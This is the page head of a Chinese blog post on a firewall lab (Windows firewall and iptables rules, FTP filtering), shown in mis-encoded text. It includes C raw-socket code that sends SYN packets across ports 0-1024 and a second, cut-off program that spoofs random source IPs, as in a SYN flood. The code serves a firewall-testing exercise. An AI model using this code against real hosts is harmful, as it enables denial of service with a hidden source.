<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>é˜²ç«å¢™å®éªŒ | Reus09&#39;s Blog</title>
<meta name="keywords" content="ç½‘ç»œå®‰å…¨å®éªŒ">
<meta name="description" content="é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="é˜²ç«å¢™å®éªŒ" />
<meta property="og:description" content="é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-01T21:22:48+00:00" />
<meta property="article:modified_time" content="2022-09-11T15:41:19+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="é˜²ç«å¢™å®éªŒ"/>
<meta name="twitter:description" content="é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "é˜²ç«å¢™å®éªŒ",
      "item": "http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "é˜²ç«å¢™å®éªŒ",
  "name": "é˜²ç«å¢™å®éªŒ",
  "description": "é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T",
  "keywords": [
    "ç½‘ç»œå®‰å…¨å®éªŒ"
  ],
  "articleBody": "é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š\nè¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®ã€‚ è¿‡æ»¤R-\u003eLä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®ï¼ŒæŸ¥çœ‹ç°è±¡ã€‚ èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ã€‚ é…ç½®linuxç³»ç»Ÿä¸‹iptablesé˜²ç«å¢™ï¼›åœ¨linuxç³»ç»Ÿä¸‹ï¼Œé…ç½®iptablesé˜²ç«å¢™ï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\nIptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ã€‚ Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ã€‚ è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼›ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœºï¼› å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœºã€‚ é€‰åšï¼šå®Œæˆä¸‹è¿°åŠŸèƒ½ï¼š\nç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ï¼› æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ï¼› 0x02 å®éªŒå‰æ å®éªŒå‰æçŸ¥è¯†\né˜²ç«å¢™å®šä¹‰ï¼š\né˜²ç«å¢™æ˜¯ä½äºä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ç½‘ç»œé—´ï¼Œå®æ–½ç½‘é—´è®¿é—®æ§åˆ¶çš„ä¸€ç»„ç»„ä»¶çš„é›†åˆã€‚ é˜²ç«å¢™æ˜¯æŒ‡éš”ç¦»åœ¨å†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„ä¸€é“é˜²å¾¡ç³»ç»Ÿï¼Œæ˜¯è¿™ä¸€ç±»é˜²èŒƒæªæ–½çš„æ€»ç§°ã€‚ é˜²ç«å¢™è®¾è®¡ç›®æ ‡ï¼š\nå†…éƒ¨å’Œå¤–éƒ¨ä¹‹é—´çš„æ‰€æœ‰ç½‘ç»œæ•°æ®æµå¿…é¡»ç»è¿‡é˜²ç«å¢™ã€‚ åªæœ‰ç¬¦åˆå®‰å…¨ç­–ç•¥çš„æ•°æ®æµï¼Œå³ï¼Œç»è¿‡æˆæƒçš„æ•°æ®æµæ‰èƒ½é€šè¿‡é˜²ç«å¢™ã€‚ é˜²ç«å¢™è‡ªèº«ä¸èƒ½è¢«æ”»ç ´ã€‚ é˜²ç«å¢™ç»å…¸éƒ¨ç½²\né˜²ç«å¢™åŠŸèƒ½æ¨¡å—\né˜²ç«å¢™ç±»å‹\nåŒ…è¿‡æ»¤é˜²ç«å¢™ åŒ…è¿‡æ»¤é˜²ç«å¢™ç”¨è§„åˆ™æ£€æµ‹æ¯ä¸ªIPåŒ…ï¼Œæ ¹æ®ç»“æœæ”¾è¡Œæˆ–ä¸¢å¼ƒè¿™äº›æ•°æ®åŒ…ã€‚ åŒ…è¿‡æ»¤é˜²ç«å¢™ä¸€èˆ¬ä¼šé…ç½®ä¸ºåŒå‘è¿‡æ»¤ï¼Œå³é’ˆå¯¹è¿›å…¥å†…éƒ¨ç½‘ç»œå’Œç¦»å¼€å†…éƒ¨ç½‘ç»œä¸¤ä¸ªæ–¹å‘çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š æºã€ç›®IPåœ°å€ï¼Œ æºã€ç›®ç«¯å£ï¼Œä¾‹å¦‚ï¼šFTP(21)ã€ HTTP(80) ã€DNS(53)â€¦ åè®®ç±»å‹ï¼Œä¾‹å¦‚ï¼šTCPã€ UDPã€ ICMP ã€IGMPâ€¦ çŠ¶æ€æ£€æŸ¥é˜²ç«å¢™ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š ç½‘ç»œæ¥å£ï¼Œä¾‹å¦‚ï¼šeth0ç”¨äºå…¥ç«™ï¼Œeth1ç”¨äºå‡ºç«™â€¦ IPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šæºè·¯ç”±ã€è®°å½•è·¯ç”±â€¦ TCPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šSYN ã€ACKã€ FIN ã€RSTâ€¦ æ•°æ®åŒ…æµå‘ï¼Œä¾‹å¦‚ï¼šå…¥ç«™ï¼ˆinï¼‰æˆ–å‡ºç«™ï¼ˆoutï¼‰ ç”µè·¯çº§ä»£ç†é˜²ç«å¢™ æ˜¯ä¸€ä¸ªé€šç”¨ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒå·¥ä½œäºOSIäº’è”æ¨¡å‹çš„ä¼šè¯å±‚æˆ–æ˜¯TCP/IPåè®®çš„TCPå±‚ã€‚ å®ƒé€‚ç”¨äºå¤šä¸ªåè®®ï¼Œä½†å®ƒä¸èƒ½è¯†åˆ«åœ¨åŒä¸€ä¸ªåè®®æ ˆä¸Šè¿è¡Œçš„ä¸åŒçš„åº”ç”¨ï¼Œå½“ç„¶ä¹Ÿå°±ä¸éœ€è¦å¯¹ä¸åŒçš„åº”ç”¨è®¾ç½®ä¸åŒçš„ä»£ç†æ¨¡å—ï¼Œä½†è¿™ç§ä»£ç†éœ€è¦å¯¹å®¢æˆ·ç«¯ä½œé€‚å½“ä¿®æ”¹ã€‚ å®ƒæ¥å—å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œä»£ç†å®¢æˆ·ç«¯å®Œæˆç½‘ç»œè¿æ¥ï¼Œå»ºç«‹èµ·ä¸€ä¸ªå›è·¯ï¼Œå¯¹æ•°æ®åŒ…èµ·è½¬å‘ä½œç”¨ï¼Œæ•°æ®åŒ…è¢«æäº¤ç»™ç”¨æˆ·çš„åº”ç”¨å±‚æ¥å¤„ç†ã€‚ é€šè¿‡ç”µè·¯çº§ç½‘å…³ä¼ é€’çš„æ•°æ®ä¼¼ä¹èµ·æºäºé˜²ç«å¢™ï¼Œéšè—äº†è¢«ä¿æŠ¤ç½‘ç»œçš„ä¿¡æ¯ã€‚ åº”ç”¨å±‚ä»£ç†é˜²ç«å¢™ é¦–å…ˆï¼Œå®ƒå¯¹è¯¥ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯ã€‚ è‹¥ä¸ºåˆæ³•ç”¨æˆ·ï¼Œåˆ™æŠŠè¯·æ±‚è½¬å‘ç»™çœŸæ­£çš„æŸä¸ªå†…éƒ¨ç½‘ç»œçš„ä¸»æœºï¼ŒåŒæ—¶ç›‘æ§ç”¨æˆ·çš„æ“ä½œï¼Œæ‹’ç»ä¸åˆæ³•çš„è®¿é—®ã€‚ å½“å†…éƒ¨ç½‘ç»œå‘å¤–éƒ¨ç½‘ç»œç”³è¯·æœåŠ¡æ—¶ï¼Œä»£ç†æœåŠ¡å™¨çš„å·¥ä½œè¿‡ç¨‹åˆšå¥½ç›¸åã€‚ å®éªŒç¯å¢ƒ\nFTPæœåŠ¡å™¨ windows xp IP:192.168.195.162 FTPå®¢æˆ·ç«¯ ä»¥åŠ Windowsé˜²ç«å¢™ Windows xp IP:192.168.195.131 Linux é˜²ç«å¢™ Centos 7: 192.168.195.174 å®éªŒå·¥å…·\nå‘é€tcpåŒ…åˆ°ç›®çš„æœºéšæœºç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include #include #include #include #include #include #include #include #include #include #include #include #include #include struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u003e 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u003e\u003e 16) + (cksum \u0026 0xffff); cksum += (cksum \u003e\u003e 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u003ever_and_hdrlen = (4\u003c\u003c4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u003etos = 0; ip-\u003etotal_len = htons(len); ip-\u003eid = 1; ip-\u003eflags = 0x40; ip-\u003ettl = 255; ip-\u003eprotocol = IPPROTO_TCP; ip-\u003echecksum = 0; ip-\u003esrcaddr = srcaddr; // æºIPåœ°å€ ip-\u003edstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u003esport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u003edport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u003eseq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u003eack_seq = 0; tcp-\u003elen = (sizeof(struct tcphdr) / 4 \u003c\u003c 4 | 0); tcp-\u003eflag = 0x02; tcp-\u003ewin = htons(1024); tcp-\u003echecksum = 0; tcp-\u003eurg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u003ezeros = 0; pseudo-\u003eprotocol = IPPROTO_TCP; pseudo-\u003elength = htons(sizeof(struct tcphdr)); pseudo-\u003esaddr = srcaddr; pseudo-\u003edaddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ //saddr = inet_addr(\"192.168.195.145\"); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026ip, saddr, daddr); init_tcp_header(\u0026tcp, dport); init_pseudo_header(\u0026pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026on, sizeof(on)) \u003c 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\"%d ç«¯å£å·²ç»æ¢æµ‹\\n\",i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u003c 3) { fprintf(stderr, \"Usage: synflood \\n\"); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \"Failed to make raw socket\\n\"); exit(1); } for (int i = 0 ; i \u003c= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u003c 0) { fprintf(stderr, \"Failed to send syn packet\\n\"); } i +=1; } close(sockfd); return 0; } å‘é€tcpåŒ…åˆ°ç›®çš„æœºç¡®å®šç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include #include #include #include #include #include #include #include #include #include #include #include #include #include // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u003e 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u003e\u003e 16) + (cksum \u0026 0xffff); cksum += (cksum \u003e\u003e 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u003ever_and_hdrlen = (4\u003c\u003c4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u003etos = 0; ip-\u003etotal_len = htons(len); ip-\u003eid = 1; ip-\u003eflags = 0x40; ip-\u003ettl = 255; ip-\u003eprotocol = IPPROTO_TCP; ip-\u003echecksum = 0; ip-\u003esrcaddr = srcaddr; // æºIPåœ°å€ ip-\u003edstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u003esport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u003edport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u003eseq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u003eack_seq = 0; tcp-\u003elen = (sizeof(struct tcphdr) / 4 \u003c\u003c 4 | 0); tcp-\u003eflag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u003ewin = htons(1024); tcp-\u003echecksum = 0; tcp-\u003eurg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u003ezeros = 0; pseudo-\u003eprotocol = IPPROTO_TCP; pseudo-\u003elength = htons(sizeof(struct tcphdr)); pseudo-\u003esaddr = srcaddr; pseudo-\u003edaddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026ip, saddr, daddr); init_tcp_header(\u0026tcp, dport); init_pseudo_header(\u0026pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026on, sizeof(on)) \u003c 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ 